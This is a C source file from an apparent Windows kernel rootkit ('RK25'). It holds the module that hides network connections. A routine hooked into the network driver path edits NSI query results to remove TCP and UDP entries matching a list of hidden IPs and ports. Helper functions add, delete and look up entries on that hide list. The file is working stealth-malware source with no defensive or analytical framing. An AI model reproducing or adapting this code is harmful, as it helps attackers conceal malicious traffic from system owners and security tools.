#pragma once
#include "rk25_hide_net.h"

#define RK25_PROLOG_HIDE_NET "Hide Net"

PRK25_LC glLCNet;

VOID RK25RemoveTCPConn(PNSI_TCP_ENTRY tcpEntries, PNSI_STATUS_ENTRY statusEntries, PNSI_PROCESS_ENTRY processEntries, PNSI_PARAM nsiParam, SIZE_T i) {
	RK25_NET_DBG_IPV4_CONN_2(RK25_PROLOG_HIDE_NET,
		tcpEntries[i].Local.IpAddress, tcpEntries[i].Local.Port,
		tcpEntries[i].Remote.IpAddress, tcpEntries[i].Remote.Port,
		"Hide TCP local->remote: %s:%u->%s:%u"
	);
	
	RtlMoveMemory(&tcpEntries[i], &tcpEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->EntrySize);
	if (statusEntries) RtlMoveMemory(&statusEntries[i], &statusEntries[i + 1], (nsiParam->Count - i - 1) * sizeof(NSI_STATUS_ENTRY));
	if (processEntries) RtlMoveMemory(&processEntries[i], &processEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);

	nsiParam->Count--;
}

VOID RK25RemoveUDPConn(PNSI_UDP_ENTRY tcpEntries, PNSI_STATUS_ENTRY statusEntries, PNSI_PROCESS_ENTRY processEntries, PNSI_PARAM nsiParam, SIZE_T i) {
	RK25_NET_DBG_IPV4_CONN(RK25_PROLOG_HIDE_NET, tcpEntries[i].IpAddress, tcpEntries[i].Port, "Hide UDP: %s:%u");
	
	RtlMoveMemory(&tcpEntries[i], &tcpEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->EntrySize);
	if (statusEntries) RtlMoveMemory(&statusEntries[i], &statusEntries[i + 1], (nsiParam->Count - i - 1) * sizeof(NSI_STATUS_ENTRY));
	if (processEntries) RtlMoveMemory(&processEntries[i], &processEntries[i + 1], (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);

	nsiParam->Count--;
}

NTSTATUS RK25HideNetRoutine(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP pIrp,
	IN PEPROCESS eproc) {

	PIO_STACK_LOCATION pIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	PNSI_PARAM nsiParam = (PNSI_PARAM)pIrp->UserBuffer;

	if (MmIsAddressValid(nsiParam->Entries)) {
		//RK25_DBG_INFO_F(RK25_PROLOG_HIDE_NET, "NetRoutine called -> eproc:%p", eproc);

		PNSI_TCP_ENTRY tcpEntries = (PNSI_TCP_ENTRY)nsiParam->Entries;
		PNSI_UDP_ENTRY udpEntries = (PNSI_UDP_ENTRY)nsiParam->Entries;
		PNSI_STATUS_ENTRY statusEntries = (PNSI_STATUS_ENTRY)nsiParam->StatusEntries;
		PNSI_PROCESS_ENTRY processEntries = (PNSI_PROCESS_ENTRY)nsiParam->ProcessEntries;

		for (SIZE_T i = 0; i < nsiParam->Count; ++i) {
			//if (nsiParam->Type == _NSI_PARAM_TYPE_TCP)
			//	PrintTCPInformation(tcpEntries[i].Local.IpAddress, tcpEntries[i].Local.Port, tcpEntries[i].Remote.IpAddress, tcpEntries[i].Remote.Port);
			
			PRK25_HND entry;
			do {
				entry = (PRK25_HND)RK25ListEntryNext(glLCNet);
				if (entry)
					if ((entry->attr & RK25_NET_TCP) && nsiParam->Type == _NSI_PARAM_TYPE_TCP) {
						if (entry->attr & RK25_NET_LOCAL) {
							if (((entry->attr & RK25_TARGET_STRING) && entry->ip == tcpEntries[i].Local.IpAddress) ||
								((entry->attr & RK25_TARGET_DECIMAL) && entry->port == tcpEntries[i].Local.Port)) {
								RK25RemoveTCPConn(tcpEntries, statusEntries, processEntries, nsiParam, i--);
							}
						}
						else if (entry->attr & RK25_NET_REMOTE) {
							if (((entry->attr & RK25_TARGET_STRING) && entry->ip == tcpEntries[i].Remote.IpAddress) ||
								((entry->attr & RK25_TARGET_DECIMAL) && entry->port == tcpEntries[i].Remote.Port)) {
								RK25RemoveTCPConn(tcpEntries, statusEntries, processEntries, nsiParam, i--);
							}
						}
					}
					else if ((entry->attr & RK25_NET_UDP) && nsiParam->Type == _NSI_PARAM_TYPE_UDP) {
						if (((entry->attr & RK25_TARGET_STRING) && entry->ip == udpEntries[i].IpAddress) ||
							((entry->attr & RK25_TARGET_DECIMAL) && entry->port == udpEntries[i].Port)) {
							RK25RemoveUDPConn(udpEntries, statusEntries, processEntries, nsiParam, i--);
						}
					}
			} while (entry != NULL);
			RK25ListFlush(glLCNet);

		}
	}

	return STATUS_SUCCESS;
}

VOID RK25HideNetInit() {
	glLCNet = RK25ListInit(sizeof(RK25_HND));
	RK25QueueNetDriverAdd(RK25HideNetRoutine);
}
VOID RK25HideNetFree() {
	RK25QueueNetDriverDel(RK25HideNetRoutine);
	RK25ListFree(glLCNet);
}

BOOLEAN RK25HideNetAddByPort(ULONG attr, USHORT port) {
	return RK25ListAdd(glLCNet, &(RK25_HND){attr, RK25_NET_HTONS(port), 0});
}
BOOLEAN RK25HideNetAddByIP(ULONG attr, ULONG ip) {
	return RK25ListAdd(glLCNet, &(RK25_HND){attr, 0, ip});
}

VOID RK25HideNetDelByPort(USHORT port, ULONG attr) {
	RK25ListEntryDel(glLCNet, RK25HideNetGetByPort(RK25_NET_HTONS(port), attr));
	RK25ListFlush(glLCNet);
}
VOID RK25HideNetDelByIP(ULONG ip, ULONG attr) {
	RK25ListEntryDel(glLCNet, RK25HideNetGetByIP(ip, attr));
	RK25ListFlush(glLCNet);
}

PRK25_HND RK25HideNetGetByPort(USHORT port, ULONG attr) {
	PRK25_HND entry;
	do {
		entry = (PRK25_HND)RK25ListEntryNext(glLCNet);
		if (entry)
			if (entry->port == RK25_NET_HTONS(port) && (entry->attr & attr))
				break;
	} while (entry != NULL);
	RK25ListFlush(glLCNet);
	return entry;
}
PRK25_HND RK25HideNetGetByIP(ULONG ip, ULONG attr) {
	PRK25_HND entry;
	do {
		entry = (PRK25_HND)RK25ListEntryNext(glLCNet);
		if (entry) if (entry->ip == ip && (entry->attr == attr))
			break;
	} while (entry != NULL);
	RK25ListFlush(glLCNet);
	return entry;
}